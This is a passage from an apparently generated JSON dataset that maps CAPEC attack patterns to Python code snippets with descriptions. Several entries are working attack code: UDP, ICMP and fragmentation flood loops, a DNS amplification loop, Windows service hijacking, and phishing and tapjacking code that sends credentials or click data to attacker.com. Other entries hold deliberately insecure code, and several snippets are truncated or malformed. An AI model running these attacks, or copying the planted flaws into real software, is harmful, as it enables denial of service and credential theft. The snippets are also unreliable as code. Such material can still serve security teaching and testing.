        "code_snippet": "def process_data_packet(data):\n    # Assuming data comes as bytes containing a length and payload\n    length = int.from_bytes(data[:4], byteorder='big', signed=False)\n    payload = data[4:4+length]\n    \n    # Vulnerable conversion from unsigned to signed\n    signed_length = ctypes.c_int32(length).value\n    \n    # Process payload without signature verification\n    if signed_length > 0:\n        # Transmit sensitive data without encryption\n        network_socket.send(payload)\n        \n        # Store data without encryption\n        with open('received_data.txt', 'wb') as f:\n            f.write(payload)",
        "description": "This vulnerable code demonstrates multiple security issues including unsigned to signed conversion that can be exploited, lack of cryptographic signature verification, and transmission/storage of sensitive data without encryption. The code processes a data packet where the length field is improperly converted from unsigned to signed, potentially allowing an attacker to bypass size checks. Additionally, the data is transmitted and stored in cleartext without any encryption or signature verification."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import win32service\nimport win32serviceutil\nimport win32com.client\n\ndef modify_service_path(service_name, new_binary_path):\n    try:\n        # Open service control manager with full access\n        scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)\n        # Open target service\n        service = win32service.OpenService(scm, service_name, win32service.SERVICE_ALL_ACCESS)\n        \n        # Modify service configuration to point to malicious binary\n        win32service.ChangeServiceConfig(\n            service,\n            win32service.SERVICE_NO_CHANGE,\n            win32service.SERVICE_NO_CHANGE,\n            win32service.SERVICE_NO_CHANGE,\n            new_binary_path,\n            None,\n            0,\n            None,\n            None,\n            None,\n            None\n        )\n        \n        # Start the modified service\n        win32serviceutil.StartService(service_name)\n        \n    except Exception as e:\n        pass\n    finally:\n        win32service.CloseServiceHandle(service)\n        win32service.CloseServiceHandle(scm)\n\n# Example usage\nmalicious_path = 'C:\\\\Windows\\\\System32\\\\malware.exe'\nmodify_service_path('TargetService', malicious_path)",
        "description": "This code demonstrates a vulnerable implementation that allows modification of Windows service execution parameters. It opens the Service Control Manager with full access permissions and modifies a service's binary path without proper access controls or validation. The code can be exploited to replace legitimate service executables with malicious ones, leveraging weak access controls and configuration settings."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "\"\"\"\nimport ssl\nimport socket\nimport certifi\nimport requests\n\ndef insecure_certificate_handler():\n    # Disable certificate verification\n    context = ssl.create_default_context()\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n    \n    # Install custom root certificate without proper validation\n    def install_custom_cert(cert_path):\n        with open(cert_path, 'rb') as cert_file:\n            cert_data = cert_file.read()\n            ssl._create_default_https_context = ssl._create_unverified_context\n            context.load_verify_locations(cadata=cert_data)\n    \n    # Make HTTPS request without proper certificate validation\n    def make_insecure_request(url):\n        response = requests.get(url, verify=False)\n        return response.text\n    \n    # Custom SSL socket without proper certificate validation\n    def create_insecure_connection(host, port):\n        sock = socket.create_connection((host, port))\n        ssl_sock = context.wrap_socket(sock, server_hostname=host)\n        return ssl_sock\"\"\",\n    \"description\": \"This code demonstrates multiple certificate validation vulnerabilities. It disables certificate verification, allows installation of arbitrary root certificates without proper validation, makes HTTPS requests without certificate verification, and creates SSL connections that don't properly validate the certificate chain or hostname. The code bypasses critical security checks that would normally protect against man-in-the-middle attacks and malicious certificate installations.\"",
        "description": "\"This code demonstrates multiple certificate validation vulnerabilities. It disables certificate verification, allows installation of arbitrary root certificates without proper validation, makes HTTPS requests without certificate verification, and creates SSL connections that don't properly validate the certificate chain or hostname. The code bypasses critical security checks that would normally protect against man-in-the-middle attacks and malicious certificate installations.\""
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "import subprocess\nimport os\n\ndef run_in_container(command):\n    try:\n        # Vulnerable: No proper isolation or validation\n        os.chdir('/tmp')\n        subprocess.run(command, shell=True)\n        \n        # Vulnerable: Direct access to host resources\n        with open('/etc/passwd', 'r') as f:\n            sensitive_data = f.read()\n            \n        # Vulnerable: Shared memory access without protection\n        shared_mem = os.mmap(-1, 1024, flags=os.MAP_SHARED)\n        shared_mem.write(sensitive_data.encode())\n        \n        # Vulnerable: Loading untrusted library\n        import ctypes\n        untrusted_lib = ctypes.CDLL('./untrusted.so')\n        untrusted_lib.run()\n        \n    except Exception as e:\n        pass\n\n# Execute arbitrary command from untrusted source\nrun_in_container(input('Enter command: '))",
        "description": "This code demonstrates multiple vulnerabilities related to container/VM escape by improperly implementing isolation mechanisms. It allows direct execution of shell commands, access to host system files, manipulation of shared memory without proper boundaries, and loading of untrusted libraries. The code lacks proper privilege separation, boundary checks, and protection mechanisms against microarchitectural attacks."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "from flask import Flask, request\nimport requests\n\napp = Flask(__name__)\n\n@app.route('/proxy')\ndef proxy_request():\n    target_url = request.args.get('url')\n    headers = {\n        'Host': 'trusted-domain.com',\n        'X-Forwarded-Host': 'malicious-domain.com'\n    }\n    \n    # Vulnerable TLS connection setup\n    session = requests.Session()\n    session.verify = False\n    \n    # No validation of SNI vs HTTP Host header\n    response = session.get(\n        target_url,\n        headers=headers,\n        allow_redirects=True\n    )\n    \n    return response.content\n\n# Vulnerable cross-domain policy\nCROSS_DOMAIN_POLICY = '''\n<?xml version=\"1.0\"?>\n<cross-domain-policy>\n    <allow-access-from domain=\"*\" />\n</cross-domain-policy>\n'''",
        "description": "This code demonstrates several vulnerabilities related to domain fronting and improper communication channel restrictions. It implements a proxy server that doesn't validate the consistency between SNI and HTTP Host headers, accepts arbitrary redirects, disables SSL verification, and uses an overly permissive cross-domain policy. The code allows for domain fronting attacks by not validating the relationship between different domain identifiers in the request chain."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "import socket\nimport threading\n\ndef handle_client(client_socket):\n    data = client_socket.recv(1024)\n    # No limit on concurrent connections or resource allocation\n    while True:\n        # Process data without validation or rate limiting\n        client_socket.send(b'OK')\n\ndef server():\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server_socket.bind(('0.0.0.0', 12345))\n    server_socket.listen(65535)\n    \n    while True:\n        client, addr = server_socket.accept()\n        # Create new thread for each connection without limits\n        client_thread = threading.Thread(target=handle_client, args=(client,))\n        client_thread.start()\n\nserver()",
        "description": "This vulnerable server code creates a TCP socket that accepts unlimited concurrent connections without any resource constraints or rate limiting. It spawns a new thread for each connection without bounds, making it susceptible to TCP SYN flooding attacks. The server also lacks connection timeout mechanisms, proper message validation, and resource cleanup, allowing attackers to exhaust system resources through multiple connection attempts."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "\"\"\"\nimport xml.etree.ElementTree as ET\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    # Accept XML data without validation\n    xml_data = request.data.decode('utf-8')\n    \n    try:\n        # Parse XML without any schema validation or entity restriction\n        parser = ET.XMLParser()\n        tree = ET.fromstring(xml_data, parser=parser)\n        \n        # Process the XML without sanitization\n        username = tree.find('credentials/username').text\n        password = tree.find('credentials/password').text\n        \n        # Vulnerable authentication logic relying on client-side data\n        if username and password:\n            return \"Authentication successful\"\n            \n    except Exception as e:\n        return str(e)\n    \n    return \"Authentication failed\"\n\nif __name__ == '__main__':\n    app.run(debug=True)\n\"\"\",\n    \"description\": \"This code demonstrates multiple XML-related vulnerabilities including missing XML validation, improper handling of XML external entities, potential XML injection, and client-side authentication enforcement. The application accepts unvalidated XML input, processes it without proper schema validation, and makes security decisions based on unsanitized client-provided data.\"",
        "description": "\"This code demonstrates multiple XML-related vulnerabilities including missing XML validation, improper handling of XML external entities, potential XML injection, and client-side authentication enforcement. The application accepts unvalidated XML input, processes it without proper schema validation, and makes security decisions based on unsanitized client-provided data.\""
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "import random\nimport time\n\nclass SignatureGenerator:\n    def __init__(self):\n        self.seed = int(time.time())\n        random.seed(self.seed)\n        self.private_key = random.randint(1000, 9999)\n    \n    def generate_signature(self, message):\n        # Using weak PRNG and predictable seed\n        pseudo_random = (self.seed * 1234 + self.private_key) % 10000\n        signature = (message + str(pseudo_random)).encode('utf-8')\n        return signature\n    \n    def verify_signature(self, message, signature):\n        generated = self.generate_signature(message)\n        return generated == signature\n\n# Usage\nsigner = SignatureGenerator()\nmessage = \"transfer_money\"\nsignature = signer.generate_signature(message)",
        "description": "This vulnerable code demonstrates weak signature generation using predictable random numbers and time-based seeding. The signature generation relies on a simple mathematical operation with a predictable seed (current time) and weak random number generation. An attacker can predict the signature by observing the time of generation and reverse-engineering the simple algorithm, allowing them to forge valid signatures for arbitrary messages."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "import socket\nimport random\n\ndef udp_flood():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    target_ip = '192.168.1.1'\n    target_port = 80\n    payload = b'X' * 1024  # 1KB of data\n    \n    while True:\n        try:\n            # Spoofed source IP\n            spoofed_ip = f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'\n            sock.sendto(payload, (target_ip, target_port))\n            # No rate limiting or resource constraints\n            # Continuously sends large UDP packets without checking server response\n        except:\n            pass\n\n# Start flooding\nudp_flood()",
        "description": "This code demonstrates a UDP flood attack implementation that sends an unlimited stream of UDP packets to a target system. It incorporates several vulnerabilities: no resource limits (CWE-770), spoofed source addresses (CWE-941), cleartext transmission (CWE-319), no volume control (CWE-406), and no message integrity checks (CWE-924). The code continuously sends large UDP packets without any rate limiting or validation, potentially exhausting network resources."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "import socket\nimport random\n\ndef icmp_flood():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    target_ip = '192.168.1.1'\n    \n    # No rate limiting or resource allocation checks\n    while True:\n        # Spoofed source IP\n        spoofed_ip = f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}'\n        \n        # Construct raw ICMP packet with no size restrictions\n        packet = b'\\x08\\x00\\x00\\x00' + (b'\\x41' * 65000)\n        \n        # Send without verifying destination or authentication\n        try:\n            sock.sendto(packet, (target_ip, 0))\n            assert sock.getsockname() # Reachable assertion\n        except:\n            continue\n\nicmp_flood()",
        "description": "This code implements an ICMP flood attack that sends large ICMP packets continuously without any rate limiting or resource restrictions. It uses IP spoofing, lacks proper destination verification, contains a reachable assertion, and transmits data without encryption. The code demonstrates multiple vulnerabilities including unbounded resource allocation, improper communication channel restrictions, and cleartext transmission."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "from flask import Flask, request\nimport requests\n\napp = Flask(__name__)\n\n@app.route('/proxy')\ndef proxy_request():\n    url = request.args.get('url')\n    if url:\n        # No rate limiting or resource pooling\n        # No validation of URL destination\n        # Using sensitive data in GET request\n        # No limit on concurrent connections\n        session = requests.Session()\n        response = session.get(url)\n        return response.content\n\n@app.route('/search')\ndef search():\n    # No limit on query size or frequency\n    query = request.args.get('q', '')\n    results = []\n    # Resource-intensive operation with no throttling\n    for _ in range(10000):\n        results.append(process_query(query))\n    return {'results': results}\n\ndef process_query(q):\n    # Simulate expensive operation\n    import time\n    time.sleep(0.1)\n    return {'query': q}\n\nif __name__ == '__main__':\n    app.run(threaded=True)",
        "description": "This vulnerable code demonstrates an HTTP flooding vulnerability through multiple vectors: lack of rate limiting, unrestricted resource allocation, unsafe handling of GET parameters, and insufficient resource pooling. The /proxy endpoint allows SSRF attacks, while the /search endpoint is susceptible to resource exhaustion through unlimited query processing. The application uses GET requests with sensitive parameters and implements no protection against request flooding or resource depletion."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "from flask import Flask\nimport ssl\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return 'Hello, World!'\n\nif __name__ == '__main__':\n    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n    ssl_context.load_cert_chain('server.crt', 'server.key')\n    \n    # Vulnerable SSL configuration without resource limits\n    app.run(\n        host='0.0.0.0',\n        port=443,\n        ssl_context=ssl_context,\n        threaded=True,\n        # No connection limits or timeouts set\n        # No maximum worker threads defined\n        # No request rate limiting\n    )",
        "description": "This code creates a Flask web server with SSL/TLS support but fails to implement any resource controls or limits. It allows unlimited SSL renegotiations, unbounded thread creation, and lacks connection timeouts or rate limiting. This makes it vulnerable to SSL/TLS flooding attacks where attackers can exhaust server resources through repeated connection attempts and renegotiations."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "import socket\nimport random\n\ndef dns_amplification_attack(target_ip, dns_server):\n    # Create raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    # Craft DNS query with spoofed source IP\n    dns_query = b'\\x00\\x00\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x03www\\x07example\\x03com\\x00\\x00\\xff\\x00\\x01'\n    \n    while True:\n        # Random source port for each request\n        src_port = random.randint(1024, 65535)\n        \n        # Send multiple DNS queries with spoofed IP\n        for _ in range(1000):\n            sock.sendto(dns_query, (dns_server, 53))\n        \n        # No rate limiting or authentication check\n        # Each small query generates large response to target",
        "description": "This code demonstrates a DNS amplification attack where small DNS queries are sent to a DNS server with a spoofed source IP (the target). The DNS server then sends much larger responses to the target IP. The code shows multiple vulnerabilities: no resource limits (CWE-770), asymmetric resource consumption (CWE-405), no network traffic volume control (CWE-406), no authentication before amplification (CWE-408), and incorrectly specified destination allowing spoofing (CWE-941)."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "def process_template(template_str, replacements):\n    result = template_str\n    for key, value in replacements.items():\n        while f'${key}' in result:\n            result = result.replace(f'${key}', value)\n    return result\n\ndef vulnerable_expansion():\n    # Create a large recursive template\n    replacements = {\n        'A': '${B}' * 1000,\n        'B': '${C}' * 1000,\n        'C': 'x' * 1000\n    }\n    \n    template = '${A}'\n    result = process_template(template, replacements)\n    return result",
        "description": "This code demonstrates a vulnerable template expansion system that can lead to excessive memory allocation. The process_template function recursively expands template variables without any limits on memory usage or expansion depth. The vulnerable_expansion function creates a template that, when expanded, causes exponential growth in memory usage through nested substitutions. Each substitution multiplies the size by 1000, leading to potential memory exhaustion and system crashes."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "import re\ndef validate_email(email):\n    # Vulnerable regex pattern with catastrophic backtracking\n    pattern = r'([a-zA-Z0-9]+)*@([a-zA-Z0-9]+)*\\.([a-zA-Z]{2,})*'\n    if re.match(pattern, email):\n        return True\n    return False\n\ndef process_user_input():\n    # Process multiple email validations without resource limits\n    while True:\n        email = input('Enter email to validate: ')\n        result = validate_email(email)\n        print(f'Valid: {result}')",
        "description": "This code contains a vulnerable email validation regex that can be exploited through catastrophic backtracking. The pattern uses nested quantifiers (*) without proper anchors or restrictions, making it susceptible to ReDoS attacks. When given specially crafted input like 'a'*50+'@', the regex engine will attempt an exponential number of matching attempts, potentially exhausting CPU resources. Additionally, the validation runs in an infinite loop without any resource consumption controls."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "from flask import Flask, request\nfrom lxml import etree\n\napp = Flask(__name__)\n\n@app.route('/soap', methods=['POST'])\ndef process_soap():\n    soap_data = request.data\n    try:\n        # Parse SOAP message without size validation\n        xml_doc = etree.fromstring(soap_data)\n        \n        # Process arrays from SOAP message without limits\n        for array_elem in xml_doc.findall('.//Array'):\n            size = int(array_elem.get('size', 0))\n            # Blindly allocate memory for array\n            array_content = [None] * size\n            \n            # Process array elements\n            for item in array_elem:\n                index = int(item.get('index', 0))\n                array_content[index] = item.text\n                \n        return 'Success', 200\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable code implements a SOAP web service that processes XML messages containing arrays. It demonstrates multiple vulnerabilities: it doesn't limit the size of incoming SOAP messages or array declarations (CWE-770), performs unchecked sequential memory allocations for arrays (CWE-1325), and doesn't validate length parameters against actual data (CWE-130). The code blindly allocates memory based on the size attribute without any bounds checking, making it susceptible to XML-based DoS attacks through oversized array declarations."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "\"\"\"\nimport socket\nimport struct\n\ndef fragment_tcp_packet(target_ip, payload):\n    # Create raw socket\n    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    \n    # Craft TCP header with flags pushed to second fragment\n    tcp_header = struct.pack('!HHLLBBHHH',\n        1234,                # Source Port\n        80,                  # Destination Port\n        0,                   # Sequence Number\n        0,                   # Acknowledgment Number\n        5 << 4,             # Data Offset\n        0,                  # Flags (pushed to second fragment)\n        8192,               # Window Size\n        0,                  # Checksum\n        0                   # Urgent Pointer\n    )\n    \n    # Split packet into fragments\n    fragment1 = tcp_header[:16]  # First fragment without flags\n    fragment2 = tcp_header[16:] + payload  # Second fragment with flags and data\n    \n    # Send fragments without rate limiting\n    while True:\n        s.sendto(fragment1, (target_ip, 0))\n        s.sendto(fragment2, (target_ip, 0))\n\"\"\",\n    \"description\": \"This code demonstrates a TCP fragmentation attack that splits TCP packets in a way that pushes the header flags into the second fragment. The code creates raw sockets and sends fragments continuously without rate limiting, potentially overwhelming network filtering mechanisms. It lacks proper resource management and packet validation, making it vulnerable to resource exhaustion and potentially allowing bypass of security controls.\"",
        "description": "\"This code demonstrates a TCP fragmentation attack that splits TCP packets in a way that pushes the header flags into the second fragment. The code creates raw sockets and sends fragments continuously without rate limiting, potentially overwhelming network filtering mechanisms. It lacks proper resource management and packet validation, making it vulnerable to resource exhaustion and potentially allowing bypass of security controls.\""
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\n\ndef udp_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server.bind(('0.0.0.0', 5000))\n    \n    fragments = {",
        "description": "\"This code demonstrates a vulnerable UDP server that processes fragmented packets without proper resource controls. It fails to limit fragment storage per client, doesn't implement timeouts for fragment reassembly, and processes potentially malicious compressed data without safeguards. These vulnerabilities could lead to memory exhaustion, CPU overload, and resource depletion through UDP fragmentation attacks.\""
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import socket\nimport threading\nfrom scapy.all import IP, ICMP, fragment\n\ndef icmp_flood(target_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    icmp_packet = IP(dst=target_ip)/ICMP()\n    frags = fragment(icmp_packet, fragsize=8)\n    \n    while True:\n        try:\n            for frag in frags:\n                sock.sendto(bytes(frag), (target_ip, 0))\n        except:\n            pass\n\ndef launch_attack(target_ip, num_threads=50):\n    threads = []\n    for _ in range(num_threads):\n        t = threading.Thread(target=icmp_flood, args=(target_ip,))\n        threads.append(t)\n        t.start()\n    \n    for t in threads:\n        t.join()\n\ntarget = '192.168.1.1'\nlaunch_attack(target)",
        "description": "This code demonstrates an ICMP fragmentation attack by creating multiple threads that continuously send fragmented ICMP packets to a target host. The code doesn't implement any resource limits (CWE-770), potentially exhausting system resources. It creates raw sockets and sends fragmented ICMP packets without proper cleanup (CWE-404). The attack is designed to overwhelm the target's ability to reassemble the fragments, potentially causing system unresponsiveness or crashes."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "def get_config_file(filename):\n    # Allow user-supplied paths for config files\n    config_paths = [\n        '/etc/app/',\n        '/usr/local/app/',\n        './config/',\n        user_input_path  # Untrusted path from user\n    ]\n    \n    for path in config_paths:\n        full_path = path + filename\n        if os.path.exists(full_path):\n            # No access control check before reading sensitive file\n            with open(full_path, 'r') as f:\n                return f.read()\n    \n    return None\n\ndef process_uploaded_file(file):\n    # Blindly trust file extension for processing\n    if file.filename.endswith('.config'):\n        content = get_config_file(file.filename)\n        if content:\n            # Expose sensitive config data\n            return {'status': 'success', 'config': content}\n    return {'status': 'error'}",
        "description": "This vulnerable code demonstrates multiple security issues: it allows arbitrary file paths from user input, searches for configuration files in untrusted paths, lacks proper access control checks, and relies solely on file extensions for processing. The code can expose sensitive configuration files to unauthorized users and allows path traversal attacks."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\nfrom PIL import ImageGrab\nimport time\n\nclass AppScreenshotManager:\n    def __init__(self):\n        self.temp_dir = '/tmp/app_screenshots/'\n        if not os.path.exists(self.temp_dir):\n            os.makedirs(self.temp_dir)\n\n    def capture_app_state(self, app_id):\n        # Take screenshot when app goes to background\n        screenshot = ImageGrab.grab()\n        filename = f'{self.temp_dir",
        "description": "\"This code demonstrates vulnerable screenshot handling in an application by capturing and storing screenshots in an unprotected temporary directory without encryption or proper access controls. The screenshots may contain sensitive information from the application UI and remain accessible to unauthorized actors. The code fails to implement proper authorization checks and leaves sensitive data exposed in cleartext format.\""
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "\"\"\"\nfrom android import Intent, BroadcastReceiver, Context\n\nclass VulnerableReceiver(BroadcastReceiver):\n    def onReceive(self, context: Context, intent: Intent):\n        # No verification of intent source\n        username = intent.getStringExtra(\"username\")\n        password = intent.getStringExtra(\"password\")\n        \n        # Sending sensitive data via implicit intent\n        forward_intent = Intent()\n        forward_intent.setAction(\"com.example.SEND_CREDENTIALS\")\n        forward_intent.putExtra(\"username\", username)\n        forward_intent.putExtra(\"password\", password)\n        \n        # Broadcasting sensitive data without protection\n        context.sendBroadcast(forward_intent)\n\nclass MainActivity:\n    def send_sensitive_data(self):\n        # Creating implicit intent with sensitive data\n        intent = Intent()\n        intent.setAction(\"com.example.SEND_DATA\")\n        intent.putExtra(\"credit_card\", \"1234-5678-9012-3456\")\n        intent.putExtra(\"cvv\", \"123\")\n        \n        # Sending unprotected broadcast\n        self.sendBroadcast(intent)\n    \"\"\",\n    \"description\": \"This code demonstrates multiple Android security vulnerabilities including unprotected broadcast receivers, implicit intents with sensitive data, and lack of intent source verification. The code accepts sensitive information via intents without proper authorization checks and forwards it using implicit broadcasts that can be intercepted by malicious applications. It also transmits sensitive data in cleartext without message integrity verification.\"",
        "description": "\"This code demonstrates multiple Android security vulnerabilities including unprotected broadcast receivers, implicit intents with sensitive data, and lack of intent source verification. The code accepts sensitive information via intents without proper authorization checks and forwards it using implicit broadcasts that can be intercepted by malicious applications. It also transmits sensitive data in cleartext without message integrity verification.\""
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "\"\"\"\nfrom flask import Flask, render_template, request\nfrom webview import create_window\n\napp = Flask(__name__)\n\nclass WebViewBridge:\n    def __init__(self):\n        self.cookies = {",
        "description": "\"Vulnerable Python code demonstrating a WebView implementation that allows code injection, exposes dangerous methods, lacks proper source verification, and relies on client-side security. The code allows arbitrary JavaScript execution, cookie manipulation without validation, and embedding of potentially malicious content.\""
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "\"\"\"\nfrom kivy.app import App\nfrom kivy.uix.button import Button\nimport android.content.Intent as Intent\n\nclass VulnerableApp(App):\n    def send_sensitive_data(self, data):\n        # Creating an implicit intent without proper validation\n        intent = Intent()\n        intent.setAction(\"com.example.SEND_SENSITIVE_DATA\")\n        intent.putExtra(\"user_credentials\", data)\n        \n        # Broadcasting sensitive data using implicit intent\n        self.context.sendBroadcast(intent)\n    \n    def create_login_activity(self):\n        button = Button(text='Login')\n        button.bind(on_press=lambda x: self.send_sensitive_data({\n            'username': 'user123',\n            'password': 'secret_pass'",
        "description": "\"This code demonstrates a vulnerable Android application that uses implicit intents to transmit sensitive login data. The application creates a broadcast intent without properly validating the recipient or implementing intent filters, making it susceptible to intent interception attacks. The sensitive data (username and password) is sent via broadcast without proper verification of the receiving endpoint, allowing malicious applications to potentially intercept the credentials.\""
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "\"\"\"\nfrom android import Intent, BroadcastReceiver, Context\n\nclass VulnerableReceiver(BroadcastReceiver):\n    def __init__(self):\n        self.user_data = {\n            'username': 'admin',\n            'auth_token': '12345secret'",
        "description": "\"This code demonstrates a vulnerable Android broadcast receiver that accepts intents without proper verification of the sender. The receiver is publicly exported and handles sensitive data operations (retrieving and updating user data) without any authentication or authorization checks. It uses implicit intents for sensitive communication and doesn't verify the source of incoming intents, making it susceptible to unauthorized access and data manipulation from malicious applications.\""
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "\"\"\"\nfrom flask import Flask, render_template\nfrom flask_webview import WebView\nimport json\n\napp = Flask(__name__)\nwebview = WebView(app)\n\nclass BridgeInterface:\n    def __init__(self):\n        self.sensitive_data = {'admin_password': 'secret123', 'api_key': 'xyz789'",
        "description": "\"This code demonstrates a vulnerable implementation of WebView's JavaScript interface where sensitive methods are exposed globally without proper access controls. The BridgeInterface class exposes methods that can access sensitive data and execute system commands, which are accessible to any JavaScript code loaded in the WebView. The vulnerability allows malicious web pages to access these dangerous functions through the exposed AndroidBridge interface.\""
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import os\nimport shutil\nimport win32security\nimport win32con\n\ndef impersonate_system_task():\n    try:\n        # Create a fake system maintenance window\n        window = create_fake_system_window()\n        \n        # Impersonate a high-privilege user\n        token = win32security.LogonUser(\n            'admin',\n            'DOMAIN',\n            'password',\n            win32con.LOGON32_LOGON_INTERACTIVE,\n            win32con.LOGON32_PROVIDER_DEFAULT\n        )\n        \n        # Perform malicious actions with elevated privileges\n        sensitive_files = collect_sensitive_data()\n        exfiltrate_data(sensitive_files)\n        \n        # Install persistence mechanism\n        install_backdoor()\n        \n    except Exception as e:\n        pass\n    finally:\n        cleanup_traces()\n\ndef create_fake_system_window():\n    window_title = 'System Maintenance'\n    # Create a convincing system-like UI\n    return {'title': window_title, 'type': 'system_window'}\n\ndef collect_sensitive_data():\n    sensitive_paths = ['/etc/passwd', '~/.ssh', 'Documents/']\n    return sensitive_paths\n\ndef exfiltrate_data(files):\n    remote_server = 'attacker.com'\n    # Send collected data to attacker's server\n    pass\n\ndef install_backdoor():\n    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    shutil.copy('malware.exe', startup_path)",
        "description": "This code demonstrates a malicious application that impersonates a legitimate system maintenance task. It creates a deceptive UI, elevates privileges through impersonation, collects sensitive data, and establishes persistence. The code leverages improper authorization and identity impersonation vulnerabilities, while masquerading as a routine system task to avoid detection."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import webbrowser\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nclass MaliciousURLHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        if 'secure-bank-app' in self.path:\n            # Intercept URL scheme meant for banking app\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            \n            fake_login = '''<html>\n            <h1>Secure Bank Login</h1>\n            <form method=\"GET\" action=\"/login\">\n                Username: <input name=\"username\">\n                Password: <input type=\"password\" name=\"password\">\n                <input type=\"submit\" value=\"Login\">\n            </form></html>'''\n            \n            self.wfile.write(fake_login.encode())\n            \n        elif '/login' in self.path:\n            # Extract credentials from GET parameters\n            credentials = self.path.split('?')[1]\n            # Send credentials to attacker's server\n            webbrowser.open(f'http://attacker.com/steal?{credentials}')\n            \n            # Redirect to real banking site to avoid suspicion\n            self.send_response(302)\n            self.send_header('Location', 'https://realbank.com')\n            self.end_headers()\n\nserver = HTTPServer(('localhost', 8000), MaliciousURLHandler)\nserver.serve_forever()",
        "description": "This code demonstrates a malicious URL scheme handler that intercepts requests meant for a banking application. It runs a local server that captures the 'secure-bank-app://' URL scheme and presents a fake login page to steal credentials. The credentials are sent via GET request (CWE-598) and redirected to an attacker's server (CWE-601). The code represents embedded malicious functionality (CWE-506) and improper URL scheme handling (CWE-939)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import tkinter as tk\nfrom tkinter import ttk\n\ndef create_malicious_overlay():\n    # Create legitimate-looking window\n    root = tk.Tk()\n    root.title('Secure Banking App')\n    root.geometry('300x200')\n    \n    # Create transparent overlay window\n    overlay = tk.Toplevel(root)\n    overlay.attributes('-alpha', 0.1)  # Almost invisible\n    overlay.geometry('300x200')\n    overlay.lift()\n    \n    # Add invisible malicious button that captures clicks\n    malicious_button = tk.Button(overlay, text='', command=lambda: send_credentials())\n    malicious_button.place(x=50, y=100, width=200, height=30)\n    \n    # Create legitimate-looking UI elements\n    label = tk.Label(root, text='Please Enter PIN:')\n    label.pack(pady=20)\n    pin_entry = ttk.Entry(root, show='*')\n    pin_entry.pack()\n    login_button = ttk.Button(root, text='Login')\n    login_button.pack(pady=20)\n    \n    root.mainloop()\n\ndef send_credentials():\n    # Send captured click data to attacker\n    import requests\n    requests.post('http://attacker.com/collect', data={'click_captured': True})\n\ncreate_malicious_overlay()",
        "description": "This code creates a malicious UI overlay attack by implementing a transparent window that sits on top of a legitimate-looking banking application interface. The overlay contains invisible buttons that capture user clicks and send the data to an attacker, while the user believes they are interacting with the legitimate application below. The code demonstrates CWE-1021 (improper UI layer restriction), CWE-451 (UI misrepresentation), and CWE-319 (cleartext transmission of sensitive information)."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
